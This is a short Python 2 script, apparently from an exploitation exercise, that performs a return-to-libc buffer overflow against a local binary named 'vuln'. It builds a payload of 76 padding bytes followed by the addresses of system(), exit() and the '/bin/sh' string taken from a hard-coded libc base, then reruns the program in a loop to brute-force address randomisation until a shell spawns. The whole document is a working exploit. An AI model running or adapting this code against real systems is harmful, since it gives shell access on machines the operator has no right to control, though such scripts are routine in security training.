#!/usr/bin/pyhton

import sys
from struct import pack
from subprocess import call

if __name__ == '__main__':

	#139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
 	# 1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0

	#162d4c /bin/sh

	
	base_libc_addr = 0xb75e9000	
	
	system_addr_off = 0x00040310 
	exit_addr_off = 0x00033260
	bin_sh_addr_off = 0x00162d4c

	system_addr = pack("<I",base_libc_addr + system_addr_off)
	exit_addr = pack("<I",base_libc_addr + exit_addr_off)
	bin_sh_addr = pack("<I",base_libc_addr + bin_sh_addr_off)	

	offset = 76
	junk = "A"*offset
	EIP = system_addr + exit_addr + bin_sh_addr

	payload = junk + EIP

	while True:
		ret = call(["/home/mrr4ms0n/r0p/vuln", payload])
		
		if ret == 0:
			print "\n[*] Exiting...\n"
			sys.exit(0)
